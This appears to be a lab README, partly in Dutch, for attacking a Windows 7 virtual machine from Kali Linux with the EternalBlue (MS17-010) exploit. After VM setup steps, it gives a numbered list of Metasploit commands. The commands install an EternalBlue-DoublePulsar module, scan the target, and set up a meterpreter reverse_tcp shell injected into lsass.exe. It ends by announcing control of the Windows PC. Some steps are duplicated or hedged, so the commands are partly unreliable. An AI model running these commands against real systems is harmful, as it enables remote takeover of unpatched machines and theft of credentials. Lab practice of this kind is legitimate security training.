# SETUP
1) Run "Setup Script"
	- make sure Kali-2023.4-64bit is unzipped so the folder 64bit is accessible in the root
	- make sure the windows iso file is accessible in the root
	
# WINDOWS VM

1) Installeer Guest Additions op Windows
	- Open Computer - CD Drive (E:) - vboxadditions - VBoxWindowsAdditions.exe
	- Herstart VM

2) Run "Transfer To Windows VM"

3) Op de Windows VM, run de bat file "post-install-windows-7" die op het bureaublad staat

4) Open CMD en run 'ipconfig'. Noteer het IPv4 Address

# KALI VM

1: ```sudo apt-get update```

2: ```git clone https://github.com/w0rtw0rt/EternalBlue```

3: ```sudo apt-get update```

4: ```git clone https://github.com/w0rtw0rt/EternalBlue```

5: ```msfconsole```

6: ```exit```

7: ```sudo cp EternalBlue/Eternalblue-Doublepulsar-Metasploit/eternalblue-doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb```

8: ```sudo dpkg --add-architecture i386```

9: ```sudo apt-get install libwine (of gewoon wine?)```

10: ```sudo mkdir /root/.wine```

11: ```sudo mkdir /root/.wine/c_drive```

12: ```sudo metasploit```

13: ```use auxiliary/scanner/smb/smb_ms17_010```

14: ```set RHOSTS <Windows IP>```

15: ```run```

16: ```use payload/windows/x64/meterpreter/reverse_tcp```

17: ```set LHOST <Kali IP>```

18: ```use exploit/windows/smb/eternalblue_doublepulsar```

19: ```set payload payload/windows/x64/meterpreter/reverse_tcp```

20: ```set TARGET 8```

21: ```set RHOSTS <windows ip>```

22: ```set LHOST <kali ip>```

23: ```set TARGETARCHITECTURE x64```

24: ```set PROCESSINJECT lsass.exe```

25: ```set DOUBLEPULSARPATH /home/osboxes/EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps/```

26: ```set ETERNALBLUEPATH /home/osboxes/EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps/```

27: ```set WINEPATH /home/osboxes/.wine/drive_c/```

28: ```run```

YOU HAVE GOT CONTROL OVER WINDOWS PC
